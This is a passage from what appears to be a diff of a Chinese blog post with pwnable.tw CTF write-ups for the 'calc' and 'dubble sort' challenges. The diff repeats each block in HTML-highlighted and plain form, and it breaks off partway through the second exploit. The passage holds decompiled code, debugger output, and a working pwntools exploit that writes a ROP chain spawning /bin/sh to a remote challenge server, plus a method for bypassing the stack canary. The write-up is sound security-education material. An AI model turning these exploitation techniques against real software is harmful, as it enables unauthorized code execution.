<span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool-&gt;data[pool-&gt;idx - <span class="number">2</span>] += pool-&gt;data[pool-&gt;idx - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool-&gt;data[pool-&gt;idx - <span class="number">2</span>] -= pool-&gt;data[pool-&gt;idx - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool-&gt;data[pool-&gt;idx - <span class="number">2</span>] /= pool-&gt;data[pool-&gt;idx - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool-&gt;data[pool-&gt;idx - <span class="number">2</span>] *= pool-&gt;data[pool-&gt;idx - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  result = pool;</span><br><span class="line">  --pool-&gt;idx;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">pool *__cdecl eval(pool *pool, char a2)
+{
+  pool *result; // eax
+
+  if ( a2 == &#39;+&#39; )
+  {
+    pool-&gt;data[pool-&gt;idx - 2] += pool-&gt;data[pool-&gt;idx - 1];
+  }
+  else if ( a2 &gt; &#39;+&#39; )
+  {
+    if ( a2 == &#39;-&#39; )
+    {
+      pool-&gt;data[pool-&gt;idx - 2] -= pool-&gt;data[pool-&gt;idx - 1];
+    }
+    else if ( a2 == &#39;/&#39; )
+    {
+      pool-&gt;data[pool-&gt;idx - 2] /= pool-&gt;data[pool-&gt;idx - 1];
+    }
+  }
+  else if ( a2 == &#39;*&#39; )
+  {
+    pool-&gt;data[pool-&gt;idx - 2] *= pool-&gt;data[pool-&gt;idx - 1];
+  }
+  result = pool;
+  --pool-&gt;idx;
+  return result;
+}
+</code></pre>
 <p>漏洞找到后就很好做了，虽然它开了canary，但是并没有用，因为有任意地址写。这个程序是静态编译的，所以可以利用ROPgadget 生成ropchain，最后利用这个漏洞将ropchain写入栈中去执行。</p>
 <blockquote>
 <p>ROPgadget –binary calc –ropchain</p>
@@ -526,591 +586,615 @@
 <p>所以对应的数组下标为0x5a4/4 = 361</p>
 <p>调试一下，在calc函数处下个断点</p>
 <p>当程序断在calc函数时，对应的esp和ebp以及返回地址的在栈中的地址如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$esp = 0xffffc990</span><br><span class="line">$ebp = 0xffffcf48</span><br><span class="line">$ret_add = 0xffffcf4c	==&gt; 0x8049499 (main+71) ◂— mov    dword ptr [esp], 0x80bf842</span><br><span class="line">pool = 0xffffc9a8</span><br></pre></td></tr></table></figure>
-<p>泄露361偏移处的内容</p>
-<p><img src="/picture/1554784102423.png" alt="1554784102423"></p>
-<p><img src="/picture/1554784120464.png" alt="1554784120464"></p>
+<pre><code>$esp = 0xffffc990
+$ebp = 0xffffcf48
+$ret_add = 0xffffcf4c    ==&gt; 0x8049499 (main+71) ◂— mov    dword ptr [esp], 0x80bf842
+pool = 0xffffc9a8
+</code></pre><p>泄露361偏移处的内容</p>
+<p><img src="/picture/1554784102423.png" srcset="/img/loading.gif" alt="1554784102423"></p>
+<p><img src="/picture/1554784120464.png" srcset="/img/loading.gif" alt="1554784120464"></p>
 <p>可以发现把返回地址的内容泄露出来了，最后将rop链写入栈中就ok了</p>
 <p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(<span class="string">'./calc'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./calc'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10100</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sh.recvuntil(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	sl(<span class="string">"+"</span> + str(x))</span><br><span class="line">	data = sh.recvline()</span><br><span class="line">	data = int(data,<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> data &gt; y :</span><br><span class="line">		temp = data - y</span><br><span class="line">		payload = <span class="string">"+"</span> + str(x) + <span class="string">"-"</span> + str(temp)</span><br><span class="line">		sl(payload)</span><br><span class="line">		rc()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		temp = y - data</span><br><span class="line">		payload = <span class="string">"+"</span> + str(x) + <span class="string">"+"</span> + str(temp)</span><br><span class="line">		sl(payload)</span><br><span class="line">		rc()</span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">p.append(<span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p.append(<span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(u32(<span class="string">'/bin'</span>))</span><br><span class="line">p.append(<span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p.append(<span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(u32(<span class="string">'//sh'</span>))</span><br><span class="line">p.append(<span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(<span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x080481d1</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p.append(<span class="number">0x080701d1</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(<span class="number">0x080ec060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p.append(<span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(<span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(<span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(<span class="number">0x08049a21</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">	calc(<span class="number">361</span>+i,p[i])</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">""</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+local = 0
+
+if local:
+    sh = process(&#39;./calc&#39;)
+    elf = ELF(&#39;./calc&#39;)
+    libc = elf.libc
+else:
+    sh = remote(&quot;chall.pwnable.tw&quot;,10100)
+    elf = ELF(&#39;./calc&#39;)
+
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+def sd(content):
+    sh.send(content)
+
+def sl(content):
+    sh.sendline(content)
+
+def rc():
+    return sh.recv()
+
+def ru(content):
+    return sh.recvuntil(content)
+
+def calc(x,y):
+    sl(&quot;+&quot; + str(x))
+    data = sh.recvline()
+    data = int(data,10)
+    if data &gt; y :
+        temp = data - y
+        payload = &quot;+&quot; + str(x) + &quot;-&quot; + str(temp)
+        sl(payload)
+        rc()
+    else:
+        temp = y - data
+        payload = &quot;+&quot; + str(x) + &quot;+&quot; + str(temp)
+        sl(payload)
+        rc()
+
+p = []
+p.append(0x080701aa) # pop edx ; ret
+p.append(0x080ec060) # @ .data
+p.append(0x0805c34b) # pop eax ; ret
+p.append(u32(&#39;/bin&#39;))
+p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+p.append(0x080701aa) # pop edx ; ret
+p.append(0x080ec064) # @ .data + 4
+p.append(0x0805c34b) # pop eax ; ret
+p.append(u32(&#39;//sh&#39;))
+p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+p.append(0x080701aa) # pop edx ; ret
+p.append(0x080ec068) # @ .data + 8
+p.append(0x080550d0) # xor eax, eax ; ret
+p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+p.append(0x080481d1) # pop ebx ; ret
+p.append(0x080ec060) # @ .data
+p.append(0x080701d1) # pop ecx ; pop ebx ; ret
+p.append(0x080ec068) # @ .data + 8
+p.append(0x080ec060) # padding without overwrite ebx
+p.append(0x080701aa) # pop edx ; ret
+p.append(0x080ec068) # @ .data + 8
+p.append(0x080550d0) # xor eax, eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x0807cb7f) # inc eax ; ret
+p.append(0x08049a21) # int 0x80
+
+rc()
+for i in range(len(p)):
+    calc(361+i,p[i])
+
+sh.sendline(&quot;&quot;)
+sh.interactive()
+</code></pre>
 <h3 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">☁  doublesort  checksec dubblesort </span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/pwnable.tw/doublesort/dubblesort&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
-<p>简单的运行了一下，程序先要你输入一个用户名，然后输入想要排序的数字个数和要排序的数字，最后将输入的数字排好序打印出来。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">☁  doublesort  ./dubblesort </span><br><span class="line">What your name :das</span><br><span class="line">Hello das</span><br><span class="line"></span><br><span class="line">���/,How many numbers do you what to sort :3</span><br><span class="line">Enter the 0 number : 2</span><br><span class="line">Enter the 1 number : 1</span><br><span class="line">Enter the 2 number : 4</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">1 2 4 %</span><br></pre></td></tr></table></figure>
-<p>程序的逻辑不复杂，简单的逆一下。程序实现了一个简单的冒泡排序。</p>
+<pre><code>☁  doublesort  checksec dubblesort 
+[*] &#39;/home/zs0zrc/pwn/pwnable.tw/doublesort/dubblesort&#39;
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre><p>简单的运行了一下，程序先要你输入一个用户名，然后输入想要排序的数字个数和要排序的数字，最后将输入的数字排好序打印出来。</p>
+<pre><code>☁  doublesort  ./dubblesort 
+What your name :das
+Hello das
+
+���/,How many numbers do you what to sort :3
+Enter the 0 number : 2
+Enter the 1 number : 1
+Enter the 2 number : 4
+Processing......
+Result :
+1 2 4 %
+</code></pre><p>程序的逻辑不复杂，简单的逆一下。程序实现了一个简单的冒泡排序。</p>
 <p>main函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *temp; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [esp+18h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">array</span>; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+3Ch] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"What your name :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);                         <span class="comment">// 没有0截断，可以用来泄露栈上的信息</span></span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;n);</span><br><span class="line">  len = n;                                      <span class="comment">// 没有限制输入的个数，可以造成栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( n )                                      </span><br><span class="line">  &#123;</span><br><span class="line">    temp = &amp;<span class="built_in">array</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"Enter the %d number : "</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u"</span>, temp);</span><br><span class="line">      ++i;</span><br><span class="line">      len = n;</span><br><span class="line">      ++temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n &gt; i );</span><br><span class="line">  &#125;</span><br><span class="line">  sort((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;<span class="built_in">array</span>, len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Result :"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( n )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(&amp;<span class="built_in">array</span> + j);</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"%u "</span>);</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n &gt; j );</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v12 )</span><br><span class="line">    sub_BA0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int len; // eax
+  int *temp; // edi
+  unsigned int i; // esi
+  unsigned int j; // esi
+  int v7; // ST08_4
+  int result; // eax
+  unsigned int n; // [esp+18h] [ebp-74h]
+  int array; // [esp+1Ch] [ebp-70h]
+  char buf; // [esp+3Ch] [ebp-50h]
+  unsigned int v12; // [esp+7Ch] [ebp-10h]
+
+  v12 = __readgsdword(0x14u);
+  sub_8B5();
+  __printf_chk(1, &quot;What your name :&quot;);
+  read(0, &amp;buf, 0x40u);                         // 没有0截断，可以用来泄露栈上的信息
+  __printf_chk(1, &quot;Hello %s,How many numbers do you what to sort :&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;n);
+  len = n;                                      // 没有限制输入的个数，可以造成栈溢出
+  if ( n )                                      
+  {
+    temp = &amp;array;
+    i = 0;
+    do
+    {
+      __printf_chk(1, &quot;Enter the %d number : &quot;);
+      fflush(stdout);
+      __isoc99_scanf(&quot;%u&quot;, temp);
+      ++i;
+      len = n;
+      ++temp;
+    }
+    while ( n &gt; i );
+  }
+  sort((unsigned int *)&amp;array, len);
+  puts(&quot;Result :&quot;);
+  if ( n )
+  {
+    j = 0;
+    do
+    {
+      v7 = *(&amp;array + j);
+      __printf_chk(1, &quot;%u &quot;);
+      ++j;
+    }
+    while ( n &gt; j );
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v12 )
+    sub_BA0();
+  return result;
+}
+</code></pre>
 <p>可以很容易的发现其中的两个漏洞。一个是在读取name时没有进行0截断，导致可以泄露出栈上的一些信息。另一个就是它对输入数字的个数没有限制，导致了栈溢出。sort函数对输入的数字进行冒泡排序。</p>
 <ul>
 <li><p>首先是信息泄露，通过观察栈中的情况，发现可以泄露出libc的地址</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffffcedc</span><br><span class="line">00:0000│   0xffffcedc ◂— 0x61616161 (&apos;aaaa&apos;)</span><br><span class="line">01:0004│   0xffffcee0 —▸ 0xffffd10a ◂— 0x110000</span><br><span class="line">02:0008│   0xffffcee4 ◂— 0x2f /* &apos;/&apos; */</span><br><span class="line">03:000c│   0xffffcee8 ◂— 0x5e /* &apos;^&apos; */</span><br><span class="line">04:0010│   0xffffceec ◂— 0x16</span><br><span class="line">05:0014│   0xffffcef0 ◂— 0x8000</span><br><span class="line">06:0018│   0xffffcef4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">07:001c│   0xffffcef8 —▸ 0xf7fb3244 —▸ 0xf7e1b020 (_IO_check_libio) ◂— call   0xf7f22b59</span><br></pre></td></tr></table></figure>
-<p>  <img src="/picture/1554784263911.png" alt="1554784263911"></p>
+<pre><code>  pwndbg&gt; telescope 0xffffcedc
+  00:0000│   0xffffcedc ◂— 0x61616161 (&#39;aaaa&#39;)
+  01:0004│   0xffffcee0 —▸ 0xffffd10a ◂— 0x110000
+  02:0008│   0xffffcee4 ◂— 0x2f /* &#39;/&#39; */
+  03:000c│   0xffffcee8 ◂— 0x5e /* &#39;^&#39; */
+  04:0010│   0xffffceec ◂— 0x16
+  05:0014│   0xffffcef0 ◂— 0x8000
+  06:0018│   0xffffcef4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+  07:001c│   0xffffcef8 —▸ 0xf7fb3244 —▸ 0xf7e1b020 (_IO_check_libio) ◂— call   0xf7f22b59
+</code></pre><p>  <img src="/picture/1554784263911.png" srcset="/img/loading.gif" alt="1554784263911"></p>
 </li>
 </ul>
 <ul>
 <li><p>libc地址泄露出来后可以计算出system函数地址以及binsh字符串地址，加上有个栈溢出，所以这题应该是用rop来做了。但是它保护机制全开，要想办法绕过canary。这里涉及到一个知识点，就是scanf读取“+” “-” 这两个符号时，不会改变栈里的内容，而且也不会影响之后的输入。所以只要在往canary写入时，输入”+”就不会改变canary。就可以开心的进行rop了。</p>
 <p>  计算canary 相对于数组的下标</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array_add = 0xffa6ae7c</span><br><span class="line">canary_add = 0xffa6aedc</span><br><span class="line">offset = canary_add - array_add = 0x60</span><br><span class="line">index = offset/4 = 24</span><br></pre></td></tr></table></figure>
-<p>  所以canary相对于数组的下标为24，也就是第25个数字</p>
+<pre><code>  array_add = 0xffa6ae7c
+  canary_add = 0xffa6aedc
+  offset = canary_add - array_add = 0x60
+  index = offset/4 = 24
+</code></pre><p>  所以canary相对于数组的下标为24，也就是第25个数字</p>
 <p>  计算返回地址相对于数组的下标</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array_add = 0xff8ee36c</span><br><span class="line">ret_add = 0xff8ee3ec</span><br><span class="line">offset = 0x80</span><br><span class="line">index = offset/4 = 32</span><br></pre></td></tr></table></figure>
-<p>  所以返回地址相对于数组的下标为32，也就是第33个数字</p>
+<pre><code>  array_add = 0xff8ee36c
+  ret_add = 0xff8ee3ec
+  offset = 0x80
+  index = offset/4 = 32
+</code></pre><p>  所以返回地址相对于数组的下标为32，也就是第33个数字</p>
 <p>  还有一点要注意的是sort函数对数组排序的影响，canary前面的数字都要比canary小，canary后面的数字都要比canary大，不然的话sort函数就会是canary的位置发生变换，就会触发_stack_chk_fail函数。</p>
 </li>
 </ul>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 